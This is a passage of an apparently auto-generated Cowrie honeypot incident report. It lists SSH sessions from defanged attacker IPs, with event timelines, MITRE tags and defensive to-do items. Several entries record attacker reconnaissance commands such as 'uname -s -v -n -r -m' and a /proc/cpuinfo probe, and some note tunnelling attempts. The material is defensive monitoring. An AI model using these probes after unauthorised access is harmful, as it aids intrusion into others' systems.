| `2026-09-25 17:29:52` | `cowrie.client.kex` |
| `2026-09-25 17:29:52` | `cowrie.login.success` |
| `2026-09-25 17:29:52` | `cowrie.session.params` |
| `2026-09-25 17:29:52` | `cowrie.command.input` |
| `2026-09-25 17:29:52` | `cowrie.command.failed` |
| `2026-09-25 17:29:52` | `cowrie.log.closed` |
| `2026-09-25 17:29:53` | `cowrie.session.params` |
| `2026-09-25 17:29:53` | `cowrie.command.input` |
| `2026-09-25 17:29:53` | `cowrie.session.file_download` |
| `2026-09-25 17:29:53` | `cowrie.log.closed` |
| `2026-09-25 17:29:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ae9183c3a7

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-09-25 17:29 |
| **Last Seen** | 2026-09-25 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:29:53` | `cowrie.session.connect` |
| `2026-09-25 17:29:53` | `cowrie.client.version` |
| `2026-09-25 17:29:53` | `cowrie.client.kex` |
| `2026-09-25 17:29:53` | `cowrie.login.success` |
| `2026-09-25 17:29:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e56aa72f8c5

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-09-25 17:29 |
| **Last Seen** | 2026-09-25 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:29:53` | `cowrie.session.connect` |
| `2026-09-25 17:29:53` | `cowrie.client.version` |
| `2026-09-25 17:29:53` | `cowrie.client.kex` |
| `2026-09-25 17:29:53` | `cowrie.login.success` |
| `2026-09-25 17:29:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.98.62[.]211` to AbuseIPDB if not already reported
- [ ] Block `198.98.62[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71e0678e2b39

| Field | Detail |
|---|---|
| **Source IP** | `187.95.46[.]100` |
| **First Seen** | 2026-09-25 17:34 |
| **Last Seen** | 2026-09-25 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat /proc/cpuinfo|grep name|cut -f2 -d':'|uniq -c ; uname -a` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:34:20` | `cowrie.session.connect` |
| `2026-09-25 17:34:20` | `cowrie.client.version` |
| `2026-09-25 17:34:20` | `cowrie.client.kex` |
| `2026-09-25 17:34:20` | `cowrie.login.success` |
| `2026-09-25 17:34:21` | `cowrie.session.params` |
| `2026-09-25 17:34:21` | `cowrie.command.input` |
| `2026-09-25 17:34:21` | `cowrie.log.closed` |
| `2026-09-25 17:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.95.46[.]100` to AbuseIPDB if not already reported
- [ ] Block `187.95.46[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f438ed07121

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:42 |
| **Last Seen** | 2026-09-25 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:42:28` | `cowrie.session.connect` |
| `2026-09-25 17:42:28` | `cowrie.client.version` |
| `2026-09-25 17:42:28` | `cowrie.client.kex` |
| `2026-09-25 17:42:29` | `cowrie.login.success` |
| `2026-09-25 17:42:29` | `cowrie.session.params` |
| `2026-09-25 17:42:29` | `cowrie.command.input` |
| `2026-09-25 17:42:30` | `cowrie.log.closed` |
| `2026-09-25 17:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c0e5dedceb6

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-25 17:43 |
| **Last Seen** | 2026-09-25 17:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:43:36` | `cowrie.session.connect` |
| `2026-09-25 17:43:36` | `cowrie.client.version` |
| `2026-09-25 17:43:36` | `cowrie.client.kex` |
| `2026-09-25 17:43:36` | `cowrie.login.success` |
| `2026-09-25 17:43:39` | `cowrie.direct-tcpip.request` |
| `2026-09-25 17:43:39` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 17:43:39` | `cowrie.direct-tcpip.data` |
| `2026-09-25 17:43:40` | `cowrie.direct-tcpip.request` |
| `2026-09-25 17:43:41` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 17:43:41` | `cowrie.direct-tcpip.data` |
| `2026-09-25 17:43:44` | `cowrie.direct-tcpip.request` |
| `2026-09-25 17:43:44` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 17:43:44` | `cowrie.direct-tcpip.data` |
| `2026-09-25 17:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf50c9132fd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:44 |
| **Last Seen** | 2026-09-25 17:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:44:14` | `cowrie.session.connect` |
| `2026-09-25 17:44:14` | `cowrie.client.version` |
| `2026-09-25 17:44:14` | `cowrie.client.kex` |
| `2026-09-25 17:44:14` | `cowrie.login.success` |
| `2026-09-25 17:44:15` | `cowrie.session.params` |
| `2026-09-25 17:44:15` | `cowrie.command.input` |
| `2026-09-25 17:44:15` | `cowrie.log.closed` |
| `2026-09-25 17:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4ea1b9e7ade

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:45 |
| **Last Seen** | 2026-09-25 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:45:54` | `cowrie.session.connect` |
| `2026-09-25 17:45:54` | `cowrie.client.version` |
| `2026-09-25 17:45:54` | `cowrie.client.kex` |
| `2026-09-25 17:45:54` | `cowrie.login.success` |
| `2026-09-25 17:45:55` | `cowrie.session.params` |
| `2026-09-25 17:45:55` | `cowrie.command.input` |
| `2026-09-25 17:45:55` | `cowrie.log.closed` |
| `2026-09-25 17:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c6e0334df47

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:47 |
| **Last Seen** | 2026-09-25 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:47:31` | `cowrie.session.connect` |
| `2026-09-25 17:47:31` | `cowrie.client.version` |
| `2026-09-25 17:47:31` | `cowrie.client.kex` |
| `2026-09-25 17:47:32` | `cowrie.login.success` |
| `2026-09-25 17:47:32` | `cowrie.session.params` |
| `2026-09-25 17:47:32` | `cowrie.command.input` |
| `2026-09-25 17:47:33` | `cowrie.log.closed` |
| `2026-09-25 17:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a86b43cfcc6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:49 |
| **Last Seen** | 2026-09-25 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:49:07` | `cowrie.session.connect` |
| `2026-09-25 17:49:07` | `cowrie.client.version` |
| `2026-09-25 17:49:07` | `cowrie.client.kex` |
| `2026-09-25 17:49:08` | `cowrie.login.success` |
| `2026-09-25 17:49:08` | `cowrie.session.params` |
| `2026-09-25 17:49:08` | `cowrie.command.input` |
| `2026-09-25 17:49:09` | `cowrie.log.closed` |
| `2026-09-25 17:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a755afd7eb37

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:50 |
| **Last Seen** | 2026-09-25 17:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:50:45` | `cowrie.session.connect` |
| `2026-09-25 17:50:45` | `cowrie.client.version` |
| `2026-09-25 17:50:45` | `cowrie.client.kex` |
| `2026-09-25 17:50:46` | `cowrie.login.success` |
| `2026-09-25 17:50:46` | `cowrie.session.params` |
| `2026-09-25 17:50:46` | `cowrie.command.input` |
| `2026-09-25 17:50:47` | `cowrie.log.closed` |
| `2026-09-25 17:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc480e07a9d0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:52 |
| **Last Seen** | 2026-09-25 17:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:52:19` | `cowrie.session.connect` |
| `2026-09-25 17:52:19` | `cowrie.client.version` |
| `2026-09-25 17:52:19` | `cowrie.client.kex` |
| `2026-09-25 17:52:20` | `cowrie.login.success` |
| `2026-09-25 17:52:20` | `cowrie.session.params` |
| `2026-09-25 17:52:20` | `cowrie.command.input` |
| `2026-09-25 17:52:21` | `cowrie.log.closed` |
| `2026-09-25 17:52:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee5bdeab6ae

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:53 |
| **Last Seen** | 2026-09-25 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:53:51` | `cowrie.session.connect` |
| `2026-09-25 17:53:52` | `cowrie.client.version` |
| `2026-09-25 17:53:52` | `cowrie.client.kex` |
| `2026-09-25 17:53:52` | `cowrie.login.success` |
| `2026-09-25 17:53:53` | `cowrie.session.params` |
| `2026-09-25 17:53:53` | `cowrie.command.input` |
| `2026-09-25 17:53:53` | `cowrie.log.closed` |
| `2026-09-25 17:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86eea534c93f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:55 |
| **Last Seen** | 2026-09-25 17:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:55:28` | `cowrie.session.connect` |
| `2026-09-25 17:55:28` | `cowrie.client.version` |
| `2026-09-25 17:55:28` | `cowrie.client.kex` |
| `2026-09-25 17:55:28` | `cowrie.login.success` |
| `2026-09-25 17:55:29` | `cowrie.session.params` |
| `2026-09-25 17:55:29` | `cowrie.command.input` |
| `2026-09-25 17:55:29` | `cowrie.log.closed` |
| `2026-09-25 17:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11d5a6ecfc02

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-25 17:55 |
| **Last Seen** | 2026-09-25 17:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:55:28` | `cowrie.session.connect` |
| `2026-09-25 17:55:28` | `cowrie.client.version` |
| `2026-09-25 17:55:28` | `cowrie.client.kex` |
| `2026-09-25 17:55:29` | `cowrie.login.success` |
| `2026-09-25 17:55:29` | `cowrie.direct-tcpip.request` |
| `2026-09-25 17:55:29` | `cowrie.direct-tcpip.data` |
| `2026-09-25 17:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c558a6c7db4b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:57 |
| **Last Seen** | 2026-09-25 17:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:57:08` | `cowrie.session.connect` |
| `2026-09-25 17:57:08` | `cowrie.client.version` |
| `2026-09-25 17:57:08` | `cowrie.client.kex` |
| `2026-09-25 17:57:09` | `cowrie.login.success` |
| `2026-09-25 17:57:10` | `cowrie.session.params` |
| `2026-09-25 17:57:10` | `cowrie.command.input` |
| `2026-09-25 17:57:10` | `cowrie.log.closed` |
| `2026-09-25 17:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7453cc79085

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 17:58 |
| **Last Seen** | 2026-09-25 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:58:48` | `cowrie.session.connect` |
| `2026-09-25 17:58:48` | `cowrie.client.version` |
| `2026-09-25 17:58:48` | `cowrie.client.kex` |
| `2026-09-25 17:58:48` | `cowrie.login.success` |
| `2026-09-25 17:58:49` | `cowrie.session.params` |
| `2026-09-25 17:58:49` | `cowrie.command.input` |
| `2026-09-25 17:58:49` | `cowrie.log.closed` |
| `2026-09-25 17:58:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0561bf5cc57

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:00 |
| **Last Seen** | 2026-09-25 18:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:00:28` | `cowrie.session.connect` |
| `2026-09-25 18:00:28` | `cowrie.client.version` |
| `2026-09-25 18:00:28` | `cowrie.client.kex` |
| `2026-09-25 18:00:28` | `cowrie.login.success` |
| `2026-09-25 18:00:29` | `cowrie.session.params` |
| `2026-09-25 18:00:29` | `cowrie.command.input` |
| `2026-09-25 18:00:29` | `cowrie.log.closed` |
| `2026-09-25 18:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-577c32acfbc0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:02 |
| **Last Seen** | 2026-09-25 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:02:09` | `cowrie.session.connect` |
| `2026-09-25 18:02:09` | `cowrie.client.version` |
| `2026-09-25 18:02:09` | `cowrie.client.kex` |
| `2026-09-25 18:02:10` | `cowrie.login.success` |
| `2026-09-25 18:02:11` | `cowrie.session.params` |
| `2026-09-25 18:02:11` | `cowrie.command.input` |
| `2026-09-25 18:02:11` | `cowrie.log.closed` |
| `2026-09-25 18:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9b565425013

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:03 |
| **Last Seen** | 2026-09-25 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:03:48` | `cowrie.session.connect` |
| `2026-09-25 18:03:48` | `cowrie.client.version` |
| `2026-09-25 18:03:49` | `cowrie.client.kex` |
| `2026-09-25 18:03:49` | `cowrie.login.success` |
| `2026-09-25 18:03:50` | `cowrie.session.params` |
| `2026-09-25 18:03:50` | `cowrie.command.input` |
| `2026-09-25 18:03:50` | `cowrie.log.closed` |
| `2026-09-25 18:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dc9a8a2bc00

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:05 |
| **Last Seen** | 2026-09-25 18:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:05:23` | `cowrie.session.connect` |
| `2026-09-25 18:05:23` | `cowrie.client.version` |
| `2026-09-25 18:05:24` | `cowrie.client.kex` |
| `2026-09-25 18:05:24` | `cowrie.login.success` |
| `2026-09-25 18:05:25` | `cowrie.session.params` |
| `2026-09-25 18:05:25` | `cowrie.command.input` |
| `2026-09-25 18:05:25` | `cowrie.log.closed` |
| `2026-09-25 18:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06906a0585d6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:06 |
| **Last Seen** | 2026-09-25 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:06:57` | `cowrie.session.connect` |
| `2026-09-25 18:06:57` | `cowrie.client.version` |
| `2026-09-25 18:06:57` | `cowrie.client.kex` |
| `2026-09-25 18:06:58` | `cowrie.login.success` |
| `2026-09-25 18:06:58` | `cowrie.session.params` |
| `2026-09-25 18:06:58` | `cowrie.command.input` |
| `2026-09-25 18:06:59` | `cowrie.log.closed` |
| `2026-09-25 18:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a46423d000e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:08 |
| **Last Seen** | 2026-09-25 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:08:36` | `cowrie.session.connect` |
| `2026-09-25 18:08:36` | `cowrie.client.version` |
| `2026-09-25 18:08:36` | `cowrie.client.kex` |
| `2026-09-25 18:08:36` | `cowrie.login.success` |
| `2026-09-25 18:08:37` | `cowrie.session.params` |
| `2026-09-25 18:08:37` | `cowrie.command.input` |
| `2026-09-25 18:08:37` | `cowrie.log.closed` |
| `2026-09-25 18:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4a6d570327

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:10 |
| **Last Seen** | 2026-09-25 18:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:10:14` | `cowrie.session.connect` |
| `2026-09-25 18:10:14` | `cowrie.client.version` |
| `2026-09-25 18:10:14` | `cowrie.client.kex` |
| `2026-09-25 18:10:15` | `cowrie.login.success` |
| `2026-09-25 18:10:15` | `cowrie.session.params` |
| `2026-09-25 18:10:15` | `cowrie.command.input` |
| `2026-09-25 18:10:15` | `cowrie.log.closed` |
| `2026-09-25 18:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85294ea093a4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:11 |
| **Last Seen** | 2026-09-25 18:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:11:52` | `cowrie.session.connect` |
| `2026-09-25 18:11:52` | `cowrie.client.version` |
| `2026-09-25 18:11:52` | `cowrie.client.kex` |
| `2026-09-25 18:11:52` | `cowrie.login.success` |
| `2026-09-25 18:11:53` | `cowrie.session.params` |
| `2026-09-25 18:11:53` | `cowrie.command.input` |
| `2026-09-25 18:11:53` | `cowrie.log.closed` |
| `2026-09-25 18:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac513c7fedf

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-25 18:13 |
| **Last Seen** | 2026-09-25 18:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:13:36` | `cowrie.session.connect` |
| `2026-09-25 18:13:36` | `cowrie.client.version` |
